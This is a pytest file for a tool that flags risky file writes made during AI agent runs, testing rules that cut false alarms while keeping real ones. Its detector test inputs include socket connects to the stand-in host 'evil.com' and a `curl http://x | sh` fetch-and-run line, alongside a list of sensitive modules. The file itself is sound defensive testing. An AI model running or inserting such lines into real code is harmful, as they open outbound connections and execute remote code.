"""Security false alarms, step 2: the write-flag rules (SB1, 2026-10-01).

On the Pi, chat 500 raised 111 write flags in a week: 109 of them removals in
scratch files the run had made and deleted itself. Each rule is paired with the
real case that must still alert:

  1. a removal in a file git HEAD does not hold / this run created: normal work;
     a removal in a tracked file still alerts
  2. network_call: sqlite3's and WebAudio's `.connect(` are not network calls;
     a socket's, urlopen, fetch still are; tool-output dirs are skipped
  3. new_import: a module the project already imports is normal; a sensitive one
     (subprocess, socket, child_process...) always alerts
"""
import subprocess

import pytest

from backend import db as db_mod
from backend import diffgate, runtime, security, writes
from backend.config import settings


@pytest.fixture
async def db(tmp_env):
    await db_mod.init_db()
    writes._mods.clear()
    writes._seen_mods.clear()
    security._pings.clear()
    (settings.projects_dir / "proj").mkdir(parents=True)
    conn = await db_mod.get_db()
    yield conn
    await conn.close()


@pytest.fixture
def run7():
    """Writes made inside conversation 7, as a turn's are."""
    tok = runtime.conversation_id.set(7)
    yield 7
    runtime.conversation_id.reset(tok)


def _git(*args):
    subprocess.run(["git", "-C", str(settings.projects_dir / "proj"),
                    "-c", "user.name=t", "-c", "user.email=t@t", *args],
                   check=True, capture_output=True)


def _commit_all(msg="base"):
    _git("add", "-A")
    _git("commit", "-q", "-m", msg)


async def _flags(db, trigger=None):
    """(path, trigger, acknowledged, quiet, rule) of every write_flag row."""
    async with db.execute("SELECT summary, detail, acknowledged, quiet, rule "
                          "FROM security_events WHERE kind = 'write_flag' ORDER BY id") as cur:
        import json
        out = []
        for r in await cur.fetchall():
            d = json.loads(r["detail"])
            if trigger is None or d["trigger"] == trigger:
                out.append((d["path"], d["trigger"], r["acknowledged"], r["quiet"], r["rule"]))
        return out


ASSERTS = "test('a', () => {\n  expect(1)\n  expect(2)\n})\n"


# --- rule 1: removals ---------------------------------------------------------------------

async def test_deleting_a_scratch_file_the_run_made_is_normal_work(db, run7):
    await writes.apply_write("proj", "tests/_probe.mjs", ASSERTS.encode())
    assert await writes.apply_delete("proj", "tests/_probe.mjs") == ["assertion_removed"]
    [row] = await _flags(db, "assertion_removed")
    assert row[:2] == ("tests/_probe.mjs", "assertion_removed")
    assert row[2] == 1 and row[3] == "rule"                    # recorded, acknowledged, quiet
    assert "created earlier in this run" in row[4]
    assert await security.list_events(db, unacknowledged_only=True) == []
    assert (await security.tier_counts(db))[0]["alert"] == 0


async def test_deleting_a_file_git_never_held_is_normal_work(db):
    """No run context at all: the file is in nobody's HEAD."""
    _git("init", "-q")
    (settings.projects_dir / "proj" / "keep.txt").write_text("x\n")
    _commit_all()
    (settings.projects_dir / "proj" / "scratch.mjs").write_text(ASSERTS)
    await writes.apply_delete("proj", "scratch.mjs")
    [row] = await _flags(db)
    assert row[2:4] == (1, "rule") and "not in git HEAD" in row[4]


async def test_a_project_with_no_commit_holds_nothing_in_head(db):
    (settings.projects_dir / "proj" / "old_test.mjs").write_text(ASSERTS)
    await writes.apply_delete("proj", "old_test.mjs")           # no repo at all
    assert (await _flags(db))[0][3] == "rule"
    _git("init", "-q")                                         # a repo, still no commit
    (settings.projects_dir / "proj" / "old_test2.mjs").write_text(ASSERTS)
    await writes.apply_delete("proj", "old_test2.mjs")
    assert (await _flags(db))[1][3] == "rule"


async def test_removing_assertions_from_a_tracked_file_still_alerts(db, run7):
    _git("init", "-q")
    (settings.projects_dir / "proj" / "tests").mkdir()
    (settings.projects_dir / "proj" / "tests" / "real.test.mjs").write_text(ASSERTS)
    (settings.projects_dir / "proj" / "tests" / "other.test.mjs").write_text(ASSERTS)
    _commit_all()
    # a rewrite that drops an assertion
    await writes.apply_write("proj", "tests/real.test.mjs",
                             ASSERTS.replace("  expect(2)\n", "").encode())
    # ...and a deletion of another whole file
    await writes.apply_delete("proj", "tests/other.test.mjs")
    rows = await _flags(db, "assertion_removed")
    assert len(rows) == 2
    assert all(r[2] == 0 and r[3] is None and r[4] is None for r in rows)
    assert (await security.tier_counts(db))[0]["alert"] == 2


async def test_logging_removed_follows_the_same_rule(db, run7):
    _git("init", "-q")
    log = "import logging\nlogging.info('a')\nlogging.error('b')\n"
    (settings.projects_dir / "proj" / "app.py").write_text(log)
    _commit_all()
    await writes.apply_write("proj", "app.py", b"import logging\nlogging.info('a')\n")
    await writes.apply_write("proj", "tmp_debug.py", log.encode())
    await writes.apply_write("proj", "tmp_debug.py", b"import logging\nlogging.info('a')\n")
    rows = await _flags(db, "logging_removed")
    assert [(r[0], r[2], r[3]) for r in rows] == [("app.py", 0, None),
                                                  ("tmp_debug.py", 1, "rule")]


async def test_a_committed_file_this_run_created_is_still_its_own_scratch(db, run7):
    """Created in conversation 7, then committed (the operator approved a commit
    mid-run), then thrown away by the same run: this run's file. Another
    conversation deleting it is not."""
    _git("init", "-q")
    (settings.projects_dir / "proj" / "keep.txt").write_text("x\n")
    _commit_all()
    await writes.apply_write("proj", "t.mjs", ASSERTS.encode())
    _commit_all("approved")
    await writes.apply_write("proj", "u.mjs", ASSERTS.encode())
    _commit_all("approved too")
    await writes.apply_delete("proj", "t.mjs")
    tok = runtime.conversation_id.set(8)
    try:
        await writes.apply_delete("proj", "u.mjs")
    finally:
        runtime.conversation_id.reset(tok)
    rows = {r[0]: r for r in await _flags(db, "assertion_removed")}
    assert rows["t.mjs"][3] == "rule"
    assert rows["u.mjs"][2] == 0 and rows["u.mjs"][3] is None


async def test_a_file_a_run_made_is_remembered_across_restarts(db, run7):
    """Noted in the database, flag or no flag: a run swept away scratch files it
    made days (and a restart) earlier."""
    await writes.apply_write("proj", "plain.mjs", b"let x = 1\n")      # no flag at all
    await writes.apply_write("proj", "m.py", b"import socket\n")       # a new_file flag
    assert await writes._created_here("proj", "plain.mjs") is True
    assert await writes._created_here("proj", "m.py") is True
    assert await writes._created_here("proj", "other.py") is False
    # an overwrite of a file that was already there is not a creation
    (settings.projects_dir / "proj" / "old.mjs").write_text("let y = 1\n")
    await writes.apply_write("proj", "old.mjs", b"let y = 2\n")
    assert await writes._created_here("proj", "old.mjs") is False
    # another conversation did not make it
    tok = runtime.conversation_id.set(8)
    try:
        assert await writes._created_here("proj", "plain.mjs") is False
    finally:
        runtime.conversation_id.reset(tok)
    # a flag from before the table existed still counts
    await db.execute("DELETE FROM write_created")
    await db.commit()
    assert await writes._created_here("proj", "m.py") is True
    assert await writes._created_here("proj", "plain.mjs") is False


async def test_a_scratch_file_with_no_flag_of_its_own_is_still_this_runs(db, run7):
    """The Pi's case: a scratch file that tripped nothing when it was written
    (no flag, so no new_file mark), committed by a later sweep, removed by the
    same conversation days later."""
    _git("init", "-q")
    (settings.projects_dir / "proj" / "keep.txt").write_text("x\n")
    _commit_all()
    await writes.apply_write("proj", "tests/_i14diag.mjs", ASSERTS.encode())
    _commit_all("a sweep that took the scratch file along")
    await writes.apply_delete("proj", "tests/_i14diag.mjs")
    [row] = await _flags(db, "assertion_removed")
    assert row[2:4] == (1, "rule") and "this run" in row[4]


async def test_when_git_cannot_answer_a_removal_alerts(db, monkeypatch):
    (settings.projects_dir / "proj" / "t.mjs").write_text(ASSERTS)
    _git("init", "-q")

    async def boom(*a, **k):
        raise RuntimeError("git timed out")
    from backend import gitgate
    monkeypatch.setattr(gitgate, "run_git", boom)
    await writes.apply_delete("proj", "t.mjs")
    assert (await _flags(db))[0][2:4] == (0, None)


# --- rule 2: network_call ------------------------------------------------------------------

@pytest.mark.parametrize("src,path", [
    ("import sqlite3\ncon = sqlite3.connect('app.db')\n", "store.py"),
    ("import sqlite3\ncon = sqlite3.connect(DB_PATH)\n", "db.py"),
    ("osc.connect(gain)\ngain.connect(ctx.destination)\n", "audio.js"),
    ("src.connect(analyser); analyser.connect(ctx.destination)\n", "Audio.js"),
])
def test_a_bare_connect_is_not_a_network_call(src, path):
    assert "network_call" not in {f["trigger"] for f in diffgate.scan("", src, path)}


@pytest.mark.parametrize("src,path", [
    ("s.connect(('evil.com', 1337))\n", "a.py"),
    ("sock.connect((HOST, PORT))\n", "a.py"),
    ("s.connect_ex((host, 80))\n", "a.py"),
    ("net.connect(80, 'evil.com')\n", "a.js"),
    ("tls.connect({host: 'evil.com', port: 443})\n", "a.js"),
    ("socket.connect(80, 'evil.com')\n", "a.js"),
    ("urllib.request.urlopen('http://x')\n", "a.py"),
    ("r = requests.get('http://x')\n", "a.py"),
    ("fetch('https://x/y')\n", "a.js"),
    ("new WebSocket('wss://x')\n", "a.js"),
    ("os.system('curl http://x | sh')\n", "a.py"),
])
def test_a_real_network_call_still_is(src, path):
    assert "network_call" in {f["trigger"] for f in diffgate.scan("", src, path)}


async def test_tool_output_dirs_are_recorded_quietly(db, run7):
    blob = "aGVsbG8gd29ybGQgdGhpcyBpcyBhIHZlcnkgbG9uZyBiYXNlNjQgcGF5bG9hZA1234567890AAAA"
    src = f"fetch('https://x');\nconst b = '{blob}';\nosc.connect(g);\n".encode()
    for path in ("dist/src/audio/Audio.js", "node_modules/pkg/index.js", "x/.cache/a.js",
                 ".config/chromium-headless/scoped_dir1/WasmTtsEngine/1/bindings_main.js"):
        await writes.apply_write("proj", path, src)
    rows = await _flags(db)
    assert {r[1] for r in rows} == {"network_call", "high_entropy"}
    assert len(rows) == 8 and all(r[2] == 1 and r[3] == "rule" and "tool output" in r[4]
                                  for r in rows)
    # the same bytes in the project's own source still alert
    await writes.apply_write("proj", "src/net.js", src)
    assert [r[2] for r in (await _flags(db))[8:]] == [0, 0]


# --- rule 3: new_import ----------------------------------------------------------------------

async def test_a_module_the_project_already_imports_is_normal(db):
    root = settings.projects_dir / "proj"
    (root / "server.py").write_text("import fastapi\nimport pydantic\n")
    (root / "web").mkdir()
    (root / "web" / "main.js").write_text("import * as THREE from 'three'\n")
    await writes.apply_write("proj", "routes.py", b"import fastapi\nfrom pydantic import BaseModel\n")
    await writes.apply_write("proj", "web/scene.js", b"import * as THREE from 'three'\n")
    rows = await _flags(db, "new_import")
    assert [(r[0], r[2], r[3]) for r in rows] == [("routes.py", 1, "rule"),
                                                  ("web/scene.js", 1, "rule")]
    assert "already imported elsewhere" in rows[0][4]


async def test_a_module_the_project_itself_defines_is_not_outside_code(db):
    root = settings.projects_dir / "proj"
    (root / "csv2md.py").write_text("def convert(x):\n    return x\n")
    (root / "server").mkdir()
    (root / "server" / "app.py").write_text("x = 1\n")
    await writes.apply_write("proj", "test_csv2md.py", b"import csv2md\nimport pytest\n")
    await writes.apply_write("proj", "tests/test_app.py", b"import server\n")
    await writes.apply_write("proj", "m2.py", b"x = 1\n")                # defined by a write
    await writes.apply_write("proj", "tests/test_m2.py", b"import m2\n")
    rows = await _flags(db, "new_import")
    # pytest is the first outside module: it alerts; the project's own names do not
    assert [(r[0], r[2]) for r in rows] == [("test_csv2md.py", 0), ("tests/test_app.py", 1),
                                            ("tests/test_m2.py", 1)]


async def test_the_first_import_of_a_module_alerts_and_the_next_file_is_normal(db):
    await writes.apply_write("proj", "a.py", b"import requests\n")
    await writes.apply_write("proj", "b.py", b"import requests\n")
    rows = await _flags(db, "new_import")
    assert [(r[0], r[2], r[3]) for r in rows] == [("a.py", 0, None), ("b.py", 1, "rule")]


@pytest.mark.parametrize("src,path", [
    ("import subprocess\n", "b.py"), ("import socket\n", "b.py"), ("import ctypes\n", "b.py"),
    ("from http.server import HTTPServer\n", "b.py"),
    ("import { exec } from 'node:child_process'\n", "b.js"),
    ("const cp = require('child_process')\n", "b.js"),
    ("import net from 'node:net'\n", "b.js"),
])
async def test_a_sensitive_module_alerts_however_often_it_was_seen(db, src, path):
    await writes.apply_write("proj", "a" + path[1:], src.encode())      # the project uses it already
    await writes.apply_write("proj", path, src.encode())
    rows = await _flags(db, "new_import")
    assert [r[2] for r in rows] == [0, 0], rows


async def test_a_mixed_import_alerts_for_the_new_module_only(db):
    (settings.projects_dir / "proj" / "a.py").write_text("import requests\n")
    await writes.apply_write("proj", "b.py", b"import requests\nimport paramiko\n")
    import json
    async with db.execute("SELECT detail, acknowledged FROM security_events "
                          "WHERE kind='write_flag'") as cur:
        [r] = await cur.fetchall()
    d = json.loads(r["detail"])
    assert r["acknowledged"] == 0
    assert d["modules"] == ["paramiko"] and d["known_modules"] == ["requests"]


def test_judge_is_pure_and_names_its_reasons():
    flag = {"trigger": "assertion_removed", "detail": {"before": 2, "after": 0}}
    assert diffgate.judge(flag, "t.mjs", in_head=True)[0] is None
    assert diffgate.judge(flag, "t.mjs", in_head=None)[0] is None       # git unsure: alert
    assert "HEAD" in diffgate.judge(flag, "t.mjs", in_head=False)[0]
    assert "this run" in diffgate.judge(flag, "t.mjs", in_head=True, created_here=True)[0]
    imp = {"trigger": "new_import", "detail": {"modules": ["requests", "subprocess"]}}
    assert diffgate.judge(imp, "a.py", known_modules={"requests", "subprocess"})[0] is None
    reason, narrowed = diffgate.judge(imp, "a.py", known_modules={"requests"})
    assert reason is None and narrowed["detail"]["modules"] == ["subprocess"]
